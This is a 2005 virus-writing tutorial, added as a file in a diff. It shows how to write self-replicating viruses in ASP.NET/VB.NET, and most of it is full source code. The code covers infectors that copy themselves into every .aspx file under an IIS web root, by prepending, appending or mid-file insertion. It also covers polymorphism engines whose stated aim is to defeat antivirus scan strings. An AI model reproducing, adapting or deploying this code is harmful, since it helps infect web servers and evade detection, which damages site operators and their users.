@@ -1,0 +1,708 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************      ASP.NET Virus Writing Guide     ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro Words
+
+  1) File infection
+       a) Prepending
+       b) Appending
+       c) Entry Point Obscuring
+
+  2) Polymorphism
+       a) Variable Changing
+       b) Adding Trash
+       c) Number Changing
+       d) Lower/Upper Case Games
+       e) Space Games
+       f) Colon Games
+
+  3) Last Words
+
+
+
+
+
+
+
+  0) Intro Words
+
+     This time I've found another victim: ASP.NET. It is a pre-compiled language
+     running on web-servers like IIS. I want to explain 'pre-compiled' a little
+     bit: The server, when it runs a specific file for the first time, compiles
+     it for execution (not as i.E. PHP, which are just interpreted) and saves the
+     compiled version of the file. The advantage: The next executions are a lot
+     faster than at pre-processor languages like PHP. The advantage in contrast to
+     ASP is that we can use the whole amount of functions, methods, classes provided
+     by the .NET Framework. ASP.NET scripts can be written in VB.NET, C#, C++ and J#.
+     I've desided to use VB.NET for this article. For the codes I've used .NET
+     Framework 1.1 and 2.0 beta (at IIS), and the codes run at both environment.
+     Well, now let's look at the ASP.NET infection :)
+
+
+
+
+
+
+
+  1.) File infection
+
+      a) Prepending
+
+         As always, I would like to start with the prepender virus for giving you
+         the first ideas of that language. As I was not able to find a command
+         for getting the own path of the current executed file (__FILE__, %0, ...
+         in other languages), the virus searchs in every *.aspx file in the standart
+         wwwroot folder for itself. When it found itself, it searchs for victims
+         and infect them. More detailed explained after the code.
+
+
+ - - - - - - - - - - - - - [ ASP.NET Prepender Virus Example ] - - - - - - - - - - - - -
+ <!-- LUX -->
+<html>
+<head>
+  <script language="VB" runat="server">
+  Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+    Try
+      Dim di As New System.IO.DirectoryInfo("C:\Inetpub\wwwroot")
+      Dim fiArr As System.IO.FileInfo() = di.GetFiles("*.aspx")
+      Dim fri As System.IO.FileInfo
+      Dim line, file_cont As String
+      Dim i,IsInf As Integer
+      Dim VirCode As String = ""
+      For Each fri In fiArr
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+          Do
+            line = file_pointer.ReadLine()
+            file_cont=file_cont+line+Chr(13)+Chr(10)
+          Loop Until line Is Nothing
+          file_pointer.Close()
+	  For i=0 to file_cont.Length-12
+	    If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then VirCode = file_cont.Substring(i-1, 1613)
+	  Next
+      Next
+      For Each fri In fiArr
+	IsInf=0
+	file_cont=""
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+        Do
+          line = file_pointer.ReadLine()
+          file_cont=file_cont+line+Chr(13)+Chr(10)
+        Loop Until line Is Nothing
+        file_pointer.Close()
+	For i=0 to file_cont.Length-12
+	  If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then IsInf = 1
+        Next  
+	If IsInf <> 1 Then
+	  Dim file_pointerW As New System.IO.StreamWriter("C:\Inetpub\wwwroot\"+fri.Name)
+	  file_pointerW.WriteLine(VirCode+Chr(13)+Chr(10)+file_cont)
+	  file_pointerW.Close()
+	  i=file_cont.Length
+	End If
+      Next
+    Catch ex As Exception
+    End Try
+  End Sub
+  </script>
+</head>
+<body>
+<p id="ausgabe" runat="server"></p>
+</body>
+</html>
+ - - - - - - - - - - - - - [ ASP.NET Prepender Virus Example ] - - - - - - - - - - - - -
+
+         Long code for a simple prepender, hmm? Well, I already gave you the reason. Now the
+         explanaion:
+
+         --> Opens the standart folder of wwwroot ("C:\Inetpub\wwwroot")
+         --> Gets all *.aspx files in there
+         --> Searchs for its code in every *.aspx file
+         --> Saves its codes
+         --> Searchs for uninfected victims
+         --> Reads the code
+         --> Writes the viruscode and the original code to the file
+
+
+
+
+
+      b) Appending
+
+         This code is another standart-infection-type, so let's look at it. This time
+         let's put the code after the original filecontent.
+
+
+ - - - - - - - - - - - - - [ ASP.NET Appending Virus Example ] - - - - - - - - - - - - -
+ <!-- LUX -->
+<html>
+<head>
+  <script language="VB" runat="server">
+  Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+    Try
+      Dim di As New System.IO.DirectoryInfo("C:\Inetpub\wwwroot")
+      Dim fiArr As System.IO.FileInfo() = di.GetFiles("*.aspx")
+      Dim fri As System.IO.FileInfo
+      Dim line, file_cont As String
+      Dim i,IsInf As Integer
+      Dim VirCode As String = ""
+      For Each fri In fiArr
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+          Do
+            line = file_pointer.ReadLine()
+            file_cont=file_cont+line+Chr(13)+Chr(10)
+          Loop Until line Is Nothing
+          file_pointer.Close()
+	  For i=0 to file_cont.Length-12
+	    If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then VirCode = file_cont.Substring(i-1, 1613)
+	  Next
+      Next
+      For Each fri In fiArr
+	IsInf=0
+	file_cont=""
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+        Do
+          line = file_pointer.ReadLine()
+          file_cont=file_cont+line+Chr(13)+Chr(10)
+        Loop Until line Is Nothing
+        file_pointer.Close()
+	For i=0 to file_cont.Length-12
+	  If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then IsInf = 1
+        Next  
+	If IsInf <> 1 Then
+	  Dim file_pointerW As New System.IO.StreamWriter("C:\Inetpub\wwwroot\"+fri.Name)
+	  file_pointerW.WriteLine(file_cont+Chr(13)+Chr(10)+VirCode)
+	  file_pointerW.Close()
+	  i=file_cont.Length
+	End If
+      Next
+    Catch ex As Exception
+    End Try
+  End Sub
+  </script>
+</head>
+</html>
+ - - - - - - - - - - - - - [ ASP.NET Appending Virus Example ] - - - - - - - - - - - - -
+
+         There is not too much difference to the prepender code.
+
+         --> Opens the standart folder of wwwroot ("C:\Inetpub\wwwroot")
+         --> Gets all *.aspx files in there
+         --> Searchs for its code in every *.aspx file
+         --> Saves its codes
+         --> Searchs for uninfected victims
+         --> Reads the code
+         --> Writes the original code and the viruscode to the file
+
+
+
+
+
+      c) Entry Point Obscuring
+
+         This is the first techniqually interesting type of infection: Anywhere in the middle: EPO
+         The virus searchs for a valueable place which could be infected, and does it. To be more
+         precicly it searchs for a code between the html-statements. That means, it searchs for
+         '>' to infect that place. Better explanation follows at the end.
+
+
+
+ - - - - - - - - - - - - - [ ASP.NET EPO Virus Example ] - - - - - - - - - - - - -
+<html>
+<head>
+  <!-- LUX -->
+  <script language="VB" runat="server">
+  Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+     Try
+      Dim di As New System.IO.DirectoryInfo("C:\Inetpub\wwwroot")
+      Dim fiArr As System.IO.FileInfo() = di.GetFiles("*.aspx")
+      Dim fri As System.IO.FileInfo
+      Dim line, file_cont As String
+      Dim i,IsInf,rnd_num,place_c,place As Integer
+      Dim VirCode As String = ""
+      Dim placesarr(235) As Integer
+      rnd_num=0
+      place_c=0
+      For Each fri In fiArr
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+        Do
+          line = file_pointer.ReadLine()
+          file_cont=file_cont+line+Chr(13)+Chr(10)
+        Loop Until line Is Nothing
+        file_pointer.Close()
+        For i=0 to file_cont.Length-12
+          If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then VirCode = file_cont.Substring(i-1, 2494)
+        Next
+        rnd_num=rnd_num+fri.Length
+      Next
+      For Each fri In fiArr
+        IsInf=0
+        file_cont=""
+        Dim file_pointer As New System.IO.StreamReader("C:\Inetpub\wwwroot\"+fri.Name)
+        Do
+          line = file_pointer.ReadLine()
+          file_cont=file_cont+line+Chr(13)+Chr(10)
+        Loop Until line Is Nothing
+        file_pointer.Close()
+        For i=0 to file_cont.Length-12
+          If file_cont.Substring(i, 12) = "<!"+"-- LUX -->" Then IsInf = 1
+        Next
+        If IsInf <> 1 Then
+          For i=0 to file_cont.Length-10
+            If file_cont.Substring(i,1)=">" Then
+              place_c=place_c+1
+              placesarr(place_c)=i+2
+            End If
+            If i+7 <= file_cont.Length Then
+              If file_cont.Substring(i,7)="<script" Then
+                Dim found_script As Integer=0
+                While found_script=0
+                  i=i+1
+                  If file_cont.Substring(i,9)="</"+"script>" Then found_script=1
+                End While
+              End If
+            End If
+          Next
+          Dim file_pointerW As New System.IO.StreamWriter("C:\Inetpub\wwwroot\"+fri.Name)
+          place=placesarr(rnd_num Mod place_c)
+          file_pointerW.WriteLine(file_cont.Substring(0,place-1)+VirCode+file_cont.Substring(place-1,file_cont.Length-place-1))
+          file_pointerW.Close()
+          i=file_cont.Length
+        End If
+      Next
+      ausgabe.InnerHtml=place
+     Catch ex As Exception
+     End Try
+  End Sub
+  </script>
+</head>
+<body>
+<p id="ausgabe" runat="server"></p>
+</body>
+</html>
+ - - - - - - - - - - - - - [ ASP.NET EPO Virus Example ] - - - - - - - - - - - - -
+
+
+         --> Opens the standart folder of wwwroot ("C:\Inetpub\wwwroot")
+         --> Gets all *.aspx files in there
+         --> Searchs for its code in every *.aspx file
+         --> Saves its codes
+         --> Searchs for potentially victims
+         --> Reads the victim-code
+         --> Searchs for potentially places to infect (end-html-statements '>')
+         --> Gets one place to infect
+         --> Writes the first part of victim to host
+         --> Writes the virus to host
+         --> Writes the second part of victim to host
+
+
+
+
+
+
+
+  2) Polymorphism
+
+     a) Variable Changing
+
+        This is a standart polymorphism technique for script-viruses - and I think
+        it should be done in every infectable language; so I desided to do it here
+        too. Every polymorphism needs random numbers. The .NET Framework provides the
+        random numbers not as function or methode (as it's in most other languages),
+        but as System.Random - Object. This is quite strange, but not more difficult -
+        just different. Well, variable changing means to rename every variable or function
+        name in the whole code. As there is no command for the own file (or at least I
+        did not find one), I used a static path-name. But that does not mind, because
+        in a real virus we have to search for the own code anyway.
+
+
+ - - - - - - - - - - - [ ASP.NET Variable Changing Polymorphism Example ] - - - - - - - - - - -
+<%@ Page Language="VB" %>
+<script runat="server">
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+  Dim my_file_name As String = "C:\Inetpub\wwwroot\localstart.aspx"
+  Dim my_file_code, my_code_line As String
+  Dim file_pointer As New System.IO.StreamReader(my_file_name)
+  Do
+    my_code_line=file_pointer.ReadLine()
+    my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)
+  Loop Until my_code_line Is Nothing
+
+  file_pointer.Close
+  Dim my_var_arr() As String = {"my_file_name","my_file_code","my_code_line","file_pointer","my_var_arr","one_var_name","my_arr_obj","file_Wpointer","new_var_name","counter_i","new_name_length","find_new_name"}
+  Dim one_var_name As String
+  Dim my_arr_obj As new System.Random()
+  For Each one_var_name In my_var_arr
+    my_code_line=find_new_name(my_arr_obj.Next(10),my_arr_obj)
+    my_file_code=my_file_code.Replace(one_var_name, my_code_line)
+  Next
+  Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)
+  file_Wpointer.WriteLine(my_file_code)
+  file_Wpointer.Close
+End Sub
+
+Function find_new_name(new_name_length As Integer, my_arr_obj As Random)
+  Dim new_var_name As String = ""
+  Dim counter_i As Integer
+  new_name_length=new_name_length+5
+  For counter_i = 0 to new_name_length
+    new_var_name=new_var_name+Chr(my_arr_obj.Next(26)+97)
+  Next
+  find_new_name=new_var_name
+End Function
+</script>
+ - - - - - - - - - - - [ ASP.NET Variable Changing Polymorphism Example ] - - - - - - - - - - -
+
+         --> Opens itself (by static path)
+         --> Reads whole own code
+         --> Closes itself
+         --> Makes an array of all used variables
+         --> Does a for-next for all entries in the array
+         --> Gets random name with random length by the find_new_name function
+         --> Replaces the old variable with the new one
+         --> Writes the new code the the own file
+
+
+
+
+
+    b) Adding Trash
+
+       Now let's try to add some trash into the ASP.NET code. First think: What could be trash?
+       I thought of the following stuff:
+       -> Commends:
+                * Rem anything
+                * ' anything
+       -> Variable Definition:
+                * Dim [anything] As String
+                * Dim [anything] As String = "[Anything]"
+                * Dim [anything] As Integer
+
+       There would be much more possible junk, but for the first try, let's use these six
+       different options. (Some further thinks would be the writing of not used objects like
+       Dim anything As new System.Random() or other stuff.)
+
+
+ - - - - - - - - - - - [ ASP.NET Adding Trash Polymorphism Example ] - - - - - - - - - - -
+ <%@ Page Language="VB" Debug="True" %>
+ <script runat="server">
+ Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+  Dim my_file_name As String = "C:\Inetpub\wwwroot\localstart.aspx"
+  Dim my_file_code(150), my_code_line, trash_line As String
+  Dim i As Integer = 0
+  Dim my_arr_obj As new System.Random()
+  Dim file_pointer As New System.IO.StreamReader(my_file_name)
+  Do
+    my_code_line=file_pointer.ReadLine()
+    my_file_code(i)=my_code_line
+    i=i+1
+  Loop Until my_code_line Is Nothing
+  file_pointer.Close
+  Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)
+  For Each my_code_line In my_file_code
+    If my_code_line <> "" Then
+      If Mid(my_code_line,1,1)=" " Then
+        If my_arr_obj.Next(5)=1 Then file_Wpointer.WriteLine(find_trash(my_arr_obj.Next(6), my_arr_obj))
+        file_Wpointer.WriteLine(my_code_line)
+      End If
+    End If
+  Next
+  file_Wpointer.Close
+ End Sub
+ Function find_trash(which_trash As Integer, my_arr_obj As Random)
+  If which_trash = 1 Then find_trash="Dim "+find_new_name(my_arr_obj.Next(10), my_arr_obj)+" As String"
+  If which_trash = 2 Then find_trash="Dim "+find_new_name(my_arr_obj.Next(10), my_arr_obj)+" As String ="+Chr(34)+find_new_name(my_arr_obj.Next(20), my_arr_obj)+Chr(34)
+  If which_trash = 3 Then find_trash="Dim "+find_new_name(my_arr_obj.Next(10), my_arr_obj)+" As Integer"
+  If which_trash = 4 Then find_trash="Rem "+find_new_name(my_arr_obj.Next(10), my_arr_obj)
+  If which_trash = 5 Then find_trash="' "+find_new_name(my_arr_obj.Next(10), my_arr_obj)
+ End Function
+ Function find_new_name(new_name_length As Integer, my_arr_obj As Random)
+  Dim new_var_name As String = ""
+  Dim counter_i As Integer
+  new_name_length=new_name_length+5
+  For counter_i = 0 to new_name_length
+    new_var_name=new_var_name+Chr(my_arr_obj.Next(26)+97)
+  Next
+
+  find_new_name=new_var_name
+ End Function
+ </script>
+ - - - - - - - - - - - [ ASP.NET Adding Trash Polymorphism Example ] - - - - - - - - - - -
+
+         --> Opens itself (by static path)
+         --> Reads whole own code into an array
+         --> Closes itself
+         --> Checks for every line if trash should be included
+         --> Include 1 out of 5 trash lines
+         --> Writes the code into the own file
+
+
+
+
+
+
+
+    c) Number Changing
+
+       This is polymorphism technique which I've already done in JS, PHP and Ruby 
+       (see rRlf #5, 29a#7 and 29a#8)- but it is a real good technique, therefore
+       I wanted to do it in ASP.NET with VB.NET too. The idea is that numbers can
+       also be seen as calculations. That means 666 = 999-333 = 333+333 = 1332 / 2
+       It's an easy princip - but it works fine. And it helps against simple detection
+       of the virus. Let's see first an later calculation of a nice number, then the
+       code of the engine:
+
+       666=((((6093/9)-(28/4))+(((224/7)/(5-1))-((40/1)/(9-1))))-(-((10/(14-9))-1)+((36+(28/(1+6)))/5)))
+
+ - - - - - - - - - - - [ ASP.NET Number Changing Polymorphism Example ] - - - - - - - - - - -
+<%@ Page Language="VB" Debug="True" %>
+<script runat="server">
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+  Dim my_file_name As String = "C:\Inetpub\wwwroot\localstart.aspx"
+  Dim my_file_code, new_file_code, my_code_line, found_number As String
+  Dim i As Integer
+  Dim my_arr_obj As new System.Random()
+  Dim file_pointer As New System.IO.StreamReader(my_file_name)
+  Do
+    my_code_line=file_pointer.ReadLine()
+    my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)
+  Loop Until my_code_line Is Nothing
+  file_pointer.Close
+  For i=1 To my_file_code.Length
+    If Asc(Mid(my_file_code,i,1))>47 And Asc(Mid(my_file_code,i,1))<58 Then
+      found_number=""
+      While Asc(Mid(my_file_code,i,1))>47 And Asc(Mid(my_file_code,i,1))<58
+        found_number=found_number+Mid(my_file_code,i,1)
+        i=i+1
+      End While
+      new_file_code=new_file_code+get_new_num(found_number, my_arr_obj)+Mid(my_file_code,i,1)
+    Else
+      new_file_code=new_file_code+Mid(my_file_code,i,1)
+    End If
+  Next
+  Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)
+  file_Wpointer.WriteLine(new_file_code)
+  file_Wpointer.Close
+End Sub
+
+Function get_new_num(number As String, my_arr_obj As Random)
+  Dim rnd_num As Integer = my_arr_obj.Next(7)
+  Dim rnd_num_B As Integer = my_arr_obj.Next(9)+1
+  Dim new_num As String = Str(Val(number)-rnd_num_B)
+  If rnd_num=0 Then get_new_num="("+Str(Val(number)-rnd_num_B)+"+"+Str(rnd_num_B)+")"
+  If rnd_num=1 Then get_new_num="("+Str(Val(number)+rnd_num_B)+"-"+Str(rnd_num_B)+")"
+  If rnd_num=2 Then get_new_num="("+Str(Val(number)*rnd_num_B)+"/"+Str(rnd_num_B)+")"
+  If rnd_num>2 Then get_new_num=number
+  get_new_num=get_new_num.Replace(" ","")
+End Function
+</script>
+ - - - - - - - - - - - [ ASP.NET Number Changing Polymorphism Example ] - - - - - - - - - - -
+
+         --> Opens itself (by static path)
+         --> Reads whole own code into an array
+         --> Closes itself
+         --> Searchs for every letter if it's a number Chr(47) < x < Chr(58)
+         --> If found, search for the full number
+         --> Calls a function to get a new number
+         --> Use one out of tree calculations: Add, Sub, Div. It's not possible
+             to use Mul as the code has to Div it first, and that makes commas, which
+             will make errors in next generations.
+         --> Replace the number by change of 1/4
+         --> Writes new code to the file
+
+
+
+
+
+    d) Lower/Upper Case Games
+
+       This polymorphism technique was just able to bring to reality, because I've used
+       VB.NET. That language is NOT Case-Sensitive, (in contrast to C++.NET or C#). The
+       idea is, that every letter can be written uppercase or lowercase. The advantage:
+       AVers can not use simple scan strings - combined with the other techniques, this
+       is a strong way to fuck the detection of a virus. Now the code:
+
+
+ - - - - - - - - - - [ ASP.NET Lower/Upper Case Game Polymorphism Example ] - - - - - - - - - -
+<%@ Page Language="VB" Debug="True" %>
+<script runat="server">
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+  Dim my_file_name As String = "C:\Inetpub\wwwroot\localstart.aspx"
+  Dim my_file_code, new_file_code, my_code_line, found_number As String
+  Dim i As Integer
+  Dim my_arr_obj As new System.Random()
+  Dim file_pointer As New System.IO.StreamReader(my_file_name)
+  Do
+    my_code_line=file_pointer.ReadLine()
+    my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)
+  Loop Until my_code_line Is Nothing
+  file_pointer.Close
+
+  For i=1 To my_file_code.Length
+    If Asc(Mid(my_file_code,i,1))>64 And Asc(Mid(my_file_code,i,1))<91 And my_arr_obj.Next(3)=1 Then
+      new_file_code=new_file_code+Chr(Asc(Mid(my_file_code,i,1))+32)
+    ElseIf Asc(Mid(my_file_code,i,1))>96 And Asc(Mid(my_file_code,i,1))<123 And my_arr_obj.Next(3)=1 Then
+      new_file_code=new_file_code+Chr(Asc(Mid(my_file_code,i,1))-32)
+    Else
+      new_file_code=new_file_code+Mid(my_file_code,i,1)
+    End If
+  Next
+  Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)
+  file_Wpointer.WriteLine(new_file_code)
+  file_Wpointer.Close
+End Sub
+</script>
+ - - - - - - - - - - [ ASP.NET Lower/Upper Case Game Polymorphism Example ] - - - - - - - - - -
+
+         --> Opens itself (by static path)
+         --> Reads whole own code into an array
+         --> Closes itself
+         --> Checks for each byte in the code if it's a uppercase letter
+         --> If so, by a chance of 1/3: Chr(nn)+32
+         --> Checks for each byte in the code if it's a lowercase letter
+         --> If so, by a chance of 1/3: Chr(nn)-32
+         --> Writes new code to the file
+
+
+
+
+
+    e) Space Games
+
+       This technique uses the behaviour of VB.NET scripts, that they simply ignore multi
+       space between commands. That means: "End Sub" == "    End       Sub   "
+       By using that technique, AVers can not use simple scan-strings again. They have to
+       build in a function for ignoring multible spaces. And, as the other techniques too,
+       this means more work. In combination with other techniques: The less they can detect
+       static, the harder they have to work, and the more difficult it becomes to find a
+       valueable detection. Now the code:
+
+ - - - - - - - - - - [ ASP.NET Space Game Polymorphism Example ] - - - - - - - - - -
+<%@ Page Language="VB" Debug="True" %>
+<script runat="server">
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs)
+  Dim my_file_name As String = "C:\Inetpub\wwwroot\localstart.aspx"
+  Dim my_file_code, new_file_code, my_code_line, found_number As String
+  Dim i As Integer
+  Dim my_arr_obj As new System.Random()
+  Dim file_pointer As New System.IO.StreamReader(my_file_name)
+  Do
+    my_code_line=file_pointer.ReadLine()
+    my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)
+  Loop Until my_code_line Is Nothing
+  file_pointer.Close
+
+  For i=1 To my_file_code.Length
+    If Mid(my_file_code,i,1)=Chr(32) And my_arr_obj.Next(4)=1 Then new_file_code=new_file_code+chr(32)
+    new_file_code=new_file_code+Mid(my_file_code,i,1)
+  Next
+  Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)
+  file_Wpointer.WriteLine(new_file_code)
+  file_Wpointer.Close
+End Sub
+</script>
+ - - - - - - - - - - [ ASP.NET Space Game Polymorphism Example ] - - - - - - - - - -
+
+         --> Opens itself (by static path)
+         --> Reads whole own code into an array
+         --> Closes itself
+         --> Searchs for Spaces in the own code and by change of 1/4 makes a double space
+         --> Writes new code to the file
+
+
+
+
+
+    f) Colon Games
+
+       The last polymorphism-engine I'll show you uses the character ':'. This one can
+       be used for VB/VBS/VB.NET codes to combine 2 files without Chr(13,10). As this could
+       be used for viruses too, i've written that engine. Sometimes the code changes Chr(13,10)
+       to colons and sometimes the opposite. This makes the virus look quite different every
+       version. 'Sub ... ()' and 'End Sub' have to be in the same line, and therefore the code
+       ignores every Chr(13,10), which has a space before. (This is important if you want to
+       copy/paste/rewrite the code.) Well, let's look at the last code of this article:
+
+ - - - - - - - - - - [ ASP.NET Collon Game Polymorphism Example ] - - - - - - - - - -
+<%@ Page Language="VB" Debug="True" %>
+<script runat="server">
+Sub Page_Load (ByVal Sender As Object, ByVal E As EventArgs) 
+  Dim my_file_name As String = "C"+Chr(58)+"\Inetpub\wwwroot\localstart.aspx"
+  Dim my_file_code, new_file_code, my_code_line, found_number As String
+  Dim i As Integer
+  Dim my_arr_obj As new System.Random()
+  Dim file_pointer As New System.IO.StreamReader(my_file_name)
+  Do
+    my_code_line=file_pointer.ReadLine()
+    my_file_code=my_file_code+my_code_line+Chr(13)+Chr(10)
+  Loop Until my_code_line Is Nothing
+  file_pointer.Close
+
+  new_file_code=new_file_code+Mid(my_file_code,1,1)
+  For i=2 To my_file_code.Length
+    If Mid(my_file_code,i,2)=Chr(13)+Chr(10) And my_arr_obj.Next(4)=1 Then
+      If Mid(my_file_code,i-1,1)<>">" And Mid(my_file_code,i-1,1)<>" " Then
+        new_file_code=new_file_code+chr(58)
+        i=i+1
+      Else
+        new_file_code=new_file_code+Mid(my_file_code,i,1)
+      End If
+    ElseIf Mid(my_file_code,i,1)=Chr(58) and my_arr_obj.Next(4)=1 Then
+      new_file_code=new_file_code+Chr(13)+Chr(10)
+    Else
+      new_file_code=new_file_code+Mid(my_file_code,i,1)
+    End If
+  Next
+  Dim file_Wpointer As New System.IO.StreamWriter(my_file_name)
+  file_Wpointer.WriteLine(new_file_code)
+  file_Wpointer.Close 
+End Sub</script>
+ - - - - - - - - - - [ ASP.NET Collon Game Polymorphism Example ] - - - - - - - - - -
+
+         --> Opens itself (by static path)
+         --> Reads whole own code into an array
+         --> Closes itself
+         --> Searchs for Chr(13)+Chr(10) in the code
+         --> If Mid(string,i,-1) <> space and by chance of 1/4 replace it to a collon
+         --> Searchs for collons in the code
+         --> By chance of 1/4 replace it to Chr(13)+Chr(10)
+         --> Writes new code to the file
+
+
+
+
+
+
+
+  3) Last words
+
+     Another file-type is ready for infection since this article. I'm happy that I've finally
+     finished it, and that Microsoft's answere to PHP is on the list of my victims now, too. :)
+     I have already mentioned at the beginning of the article, you could write ASP.NET viruses
+     with C# or C++.NET too, but I think for this time it's ok. About ASP.NET: It's really a highly
+     interesting language, has alot of interesting feature for 'real' coding, is very easy to handle
+     client and server communication and can use the whole appility of the .NET Framework. For this
+     time - it's enough. See you out there soon! :D
+
+
+
+                                                  - - - - - - - - - - - - - - -
+                                                    Second Part To Hell/[rRlf]  
+                                                    www.spth.de.vu
+                                                    spth@priest.com
+                                                    written in November 2005
+
+                                                    ...surrealistic viruswriter...
+                                                  - - - - - - - - - - - - - - -
+
+
+    PS: We need new heros! Read this: http://vx.netlux.org/29a/29a-6/29a-6.111
